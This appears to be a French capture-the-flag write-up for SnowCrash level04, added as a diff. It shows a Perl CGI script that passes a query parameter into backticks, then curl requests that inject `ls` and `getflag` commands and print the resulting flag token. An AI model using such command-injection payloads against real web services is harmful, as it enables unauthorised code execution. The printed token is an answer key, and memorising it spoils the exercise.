@@ -1,0 +1,35 @@
+Level04 :
+
+on se connecte avec le flag03
+
+on se place dans le home : cd 
+
+on inspecte l'ensemble des dossiers et fichiers et leur droitsb : ls -la
+
+on peut voir un fichier executable en perl: level04.pl
+
+quand on l'inspecte :
+
+			level04@SnowCrash:~$ cat level04.pl
+			#!/usr/bin/perl
+			# localhost:4747
+			use CGI qw{param};
+			print "Content-type: text/html\n\n";
+			sub x {
+			  $y = $_[0];
+			  print `echo $y 2>&1`;
+			}
+			x(param("x"));
+
+on peut y voir "localhost:4747" et "Content-type: text/html" ce qui indique que c'st un serveur web
+
+on peut aussi voir que le programme prend un paramètre : "x(param("x"));"
+
+on utilise curl pour acceder au serveur (on test avec la command ls)
+—> curl 'localhost:4747/level04.pl?x=`ls`'
+
+on lui demande  d'executer getflag
+—> curl 'localhost:4747/level04.pl?x=`getflag`'
+
+ce qui nous renvoi 
+—> Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
